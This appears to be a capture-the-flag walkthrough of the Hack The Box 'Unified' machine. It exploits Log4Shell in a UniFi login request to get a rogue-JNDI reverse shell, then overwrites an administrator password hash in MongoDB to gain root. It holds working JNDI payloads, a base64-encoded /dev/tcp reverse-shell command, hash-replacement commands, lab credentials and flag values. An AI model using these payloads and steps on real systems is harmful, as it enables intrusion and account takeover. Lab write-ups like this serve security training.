# IP
10.129.220.105

## Enumeration
### Nmap
Found 6 ports running on the system
1. 22/tcp   open  ssh            
2. 6789/tcp open  ibm-db2-admin?
3. 8080/tcp open  http-proxy
4. 8443/tcp open  ssl/nagios-nsca Nagios NSCA
5. 8843/tcp open  ssl/unknown
6. 8880/tcp open  cddbp-alt?
```console
❯ nmap -sC -sV  -p- 10.129.153.24 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 11:17 IST
Nmap scan report for 10.129.153.24
Host is up (0.25s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
<----snip--->
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.129.153.24:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
8843/tcp open  ssl/unknown
| fingerprint-strings:
|   GetRequest:
<---snip--->
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Wed, 12 Oct 2022 06:01:47 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
8880/tcp open  cddbp-alt?
| fingerprint-strings:
<---snip---->
SF:x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;ba
SF:ckground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20St
SF:atus\x20404\x20\xe2\x80\x93\x20Not\x20Found</h1></body></html>")%r(HTTP
SF:Options,24E,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset
SF:=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x2
SF:0Wed,\x2012\x20Oct\x202022\x2006:01:28\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Statu
SF:s\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text
SF:/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20
SF:h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-size
SF::22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{
SF:font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;backgr
SF:ound-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20Status
SF:\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1></body></html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1027.99 seconds
```

Service running on port 8443 is running Service Unifi on going to the webpage of that service found that the software is vulnerable to an exploit  [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228) 
## BurpSuite
Went to `https://10.129.220.105:8443` added some random data to login screen, intercepted the data and went back to burpSuite
```http
POST /api/login HTTP/1.1
Host: 10.129.220.105:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.220.105:8443/manage/account/login?redirect=%2Fmanage%2Ffatal
Content-Type: application/json; charset=utf-8
Origin: https://10.129.220.105:8443
Content-Length: 70
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"admin","password":"admin","remember":false,"strict":true}
```
Sent this request to Repeater with `CTRL+R` and added code to remember json field. On listening on posrt 489 with `tcpdump` and got a ping.
```http
POST /api/login HTTP/1.1
Host: 10.129.220.105:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.220.105:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Origin: https://10.129.220.105:8443
Content-Length: 102
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.16.23/random}","strict":true}
```
```console
❯ sudo tcpdump -i tun0 port 389
[sudo] password for divu050704: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:54:38.027034 IP 10.129.220.105.60108 > 10.10.16.23.ldap: Flags [S], seq 912221919, win 64240, options [mss 1335,sackOK,TS val 4069110840 ecr 0,nop,wscale 7], length 0
19:54:38.027054 IP 10.10.16.23.ldap > 10.129.220.105.60108: Flags [R.], seq 0, ack 912221920, win 0, length 0

```

Installed Openjdk-11 and maven for  making rogue-ldap payload 
```console
❯ mvn package
<---snip--->
[INFO] Replacing original artifact with shaded artifact.
[INFO] Replacing /home/divu050704/rogue-jndi/target/RogueJndi-1.1.jar with /home/divu050704/rogue-jndi/target/RogueJndi-1.1-shaded.jar
[INFO] Dependency-reduced POM written at: /home/divu050704/rogue-jndi/dependency-reduced-pom.xml
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  02:02 min
[INFO] Finished at: 2022-10-12T19:11:38+05:30
[INFO] ------------------------------------------------------------------------
```

Created payload with base64 encoding
```console
❯ echo "bash -c bash -i >& /dev/tcp/10.10.16.23/4444 0>&1 " | base64
YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzQ0NDQgMD4mMSAK
```

Started Server with
```console
❯ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIzLzQ0NDQgMD4mMSAK}|{base64,-d}|{bash,-i}" --hostname "10.10.16.23"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.16.23:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.16.23:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.16.23:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.16.23:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.16.23:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.16.23:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.16.23:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.16.23:1389/o=groovy to artsploit.controllers.Groovy
```
Start netcat listener on port 4444<br />
Back on burpSuite change payload for repeater and sent it to the system.
```http
POST /api/login HTTP/1.1
Host: 10.129.220.105:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.220.105:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Origin: https://10.129.220.105:8443
Content-Length: 109
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.16.23:1389/o=tomcat}","strict":true}
```
Got a reverse connection and started shell with `script /dev/null -c bash`
```console
┌──(divu050704㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
10.129.220.105: inverse host lookup failed: Unknown host
connect to [10.10.16.23] from (UNKNOWN) [10.129.220.105] 59240
script /dev/null -c bash
Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$
```

Looked for open ports for mongodb on the system beacuse on linpeas.sh found that Unifi was using mongodb service
```console
unifi@unified:/tmp$ ps aux | grep mongo
unifi         67  0.4  4.1 1102716 85212 ?       Sl   14:19   0:22 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi      16122  0.0  0.0  11468  1080 pts/0    S+   15:51   0:00 grep mongo

```

Connected to mongodb with mongo utility installed on the system and looked for the username and password running on the system.
```console
unifi@unified:/tmp$ mongo --port 27117
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/
MongoDB server version: 3.6.3
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
2022-10-12T16:20:15.381+0100 I STORAGE  [main] In File::open(), ::open for '/home/unifi/.mongorc.js' failed with No such file or directory
Server has startup warnings:
2022-10-12T14:19:37.369+0100 I STORAGE  [initandlisten]
2022-10-12T14:19:37.369+0100 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2022-10-12T14:19:37.369+0100 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2022-10-12T14:19:38.618+0100 I CONTROL  [initandlisten]
2022-10-12T14:19:38.618+0100 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-10-12T14:19:38.618+0100 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-10-12T14:19:38.618+0100 I CONTROL  [initandlisten]
> show dbs
ace       0.002GB <-------------------------DATABASE
ace_stat  0.000GB
admin     0.000GB
config    0.000GB
local     0.000GB
>

unifi@unified:/tmp$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
	"name" : "administrator",
	"email" : "administrator@unified.htb",
	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
	"time_created" : NumberLong(1640900495),
	"last_site_name" : "default",
<---snip---->
```
The output reveals a user name `Administrator` and `x_shadow` or `password`. This password is unbreakable because it user sha512, so we will make our own password and change the field. ;)
```console
❯ mkpasswd -m sha-512 Password1234
$6$R.rseXhrwSSLRxqe$p9tHcPxd6S8CcL8pmU1v5Uiy9wsDDzYqYvKmSGCQQLeIDh1EAsVrMl0QRszaSNQGba1OD0P50LSE5fuhJrusA1
```
```console
unifi@unified:/tmp$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$R.rseXhrwSSLRxqe$p9tHcPxd6S8CcL8pmU1v5Uiy9wsDDzYqYvKmSGCQQLeIDh1EAsVrMl0QRszaSNQGba1OD0P50LSE5fuhJrusA1"}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 0 })
```
Logged on to the system with Credential on `https://10.129.220.105:8443`<br/>
 
Going To Settings>Site found username and password for ssh `root` `NotACrackablePassword4U2022` <br/>
Logged On to ssh 

## SSH

```console
 ssh root@10.129.220.105
The authenticity of host '10.129.220.105 (10.129.220.105)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.220.105' (ED25519) to the list of known hosts.
root@10.129.220.105's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


root@unified:~# find / -name "user.txt" 2>/dev/null
/home/michael/user.txt
root@unified:~# cat /home/michael/user.txt
6ced1a6a89e666c0620cdb10262ba127
root@unified:~# cat /root/root.txt
e50bc93c75b634e4b272d2f771c33681

```


